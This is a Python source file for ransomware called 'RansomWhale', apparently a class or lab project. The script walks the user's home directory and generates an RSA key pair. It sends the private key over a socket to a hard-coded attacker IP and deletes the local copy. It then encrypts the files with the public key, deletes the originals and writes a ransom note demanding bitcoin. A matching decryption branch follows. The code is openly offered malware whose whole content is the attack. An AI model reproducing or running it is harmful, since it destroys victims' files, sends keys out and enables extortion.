# Goals:
#### if there is a public.key file, read it, if it works, then decrypt the files
####       it will decrypt the public.key and use it to decrypt the files?
#### start off encrypting, send our key to the attacker somehow, secretly.
#### attacker has seperate program to make his key out of the victim's

### cryptography only lets you encrypt with public keys, so attacker would need to send private to decrypt


#///############[Packages]############\\\#
###### cryptography package has our RSA encryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes

import socket
import os
import glob #finds all the pathnames matching a specified pattern
##########################################



#///###########[Directory Setup]###########\\\#
homeDir = os.path.expanduser('~') #grabs user home directory
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to encrypt   
                                                       #we can switch / for linux to \\ for windows
###############################################


 
#///###########[Targeting Files]###########\\\#
file_list=[]
important = [] #where we store our key? work in progress
for filename in files:
    if "private_key" in filename:   
        important.append(filename)
        print ("I see you have a private key, let me validate that for you...")

    elif ".pem" not in filename and "HomeworkHeroes" not in filename and ".sh" not in filename and ".note" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
        file_list.append(filename)
###############################################



if len(important) == 0:  #if we dont see a private_key file, we want to encrypt all the files
    #///###########[Keygen]###########\\\#
    
    ######[attackers key]######
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    testPem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    with open("test_key_private.pem",'wb') as testKey:
        testKey.write(testPem)
        testKey.close()
    ###########################
    
    ######[Key transfer]###### https://www.thepythoncode.com/article/send-receive-files-using-sockets-python
    BUFFER_SIZE = 4096 # send 4096 bytes each time step
    host = "192.168.3.3"
    port = 5001
    filename = "test_key_private.pem"
    s = socket.socket()
    s.connect((host, port))
    
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)
            os.remove(filename)
            
    s.close()
    ##########################

    ######[victims key]######
    public_key = private_key.public_key()

    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    with open('public_key.pem', 'wb') as file:
        file.write(pem)
        file.close()
    #########################
    
    
    
    #///###########[Encrypting Files]###########\\\#
    print("RansomWhale caught you!")
    for file in file_list:
        fileName = str(file)
        extension = os.path.splitext(file)[1]  #gets extension
    
        with open(file, 'rb') as f:
            f_bytes=f.read()
    
        f_bytes_encrypted = public_key.encrypt(
            f_bytes,
            padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
            )
        )
        
        print(f'RansomWhale was hungry and ate your file {file}')
        os.remove(file) #Removes our old unencrypted file
    
        fileExtension = '.RansomWhale.mp4'  #This is just for fun, adds a Custom Extension
        encFile = fileName + fileExtension  #Builds our Encrytped file with it's name + our Custom Extension
    
        with open(encFile, 'wb') as f:      
            f.write(f_bytes_encrypted)      #Writes the Encrypted bytes to our Encrypted file.
                                            # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
    ################################################
    
    ransomNote="""
    Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
    Please send 1btc to [wallet address] along with proof of purchase. 
    to our email paymentsRansom@gmail.com. Processing could take between 2 - 5 buisness days.
    Thank you for your understanding.
    """
    print(ransomNote)
    with open('ransom.note', 'w') as file:
        file.write(ransomNote)
        file.close()
    
    
else:     #read the public.key, if it works, then decrypt the files
    #///###########[Decrypting Files]###########\\\#
    with open("private_key.pem", "rb") as key_file:
        private_key2 = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )
        
    for file in file_list: #was in important
        with open(file, 'rb') as f:
            f_bytes = f.read()
            
        try: #6/1 added try
            
            f_bytes_decrypt = private_key2.decrypt(f_bytes,
                                                padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                            algorithm=hashes.SHA256(),
                                                            label=None)
                                                )
            fileName = str(file).replace('.RansomWhale.mp4','')   #Replaces our Encrypted File's Extension with the file's Original Extensions
            decFile = fileName   #Build our Decrypted file, Filename without the RansomWhale.mp4 extension, possibly unnecessary   
            
            with open(decFile,'wb') as f:
                f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
                os.remove(file)            #Removes the old encrypted file
                print(f"Successfully decrypted {decFile}, thank you for your purchase.")
        except ValueError as e:
            print(f"Failed to decrypt {file}: {e}") #debugging purposes

    ################################################
    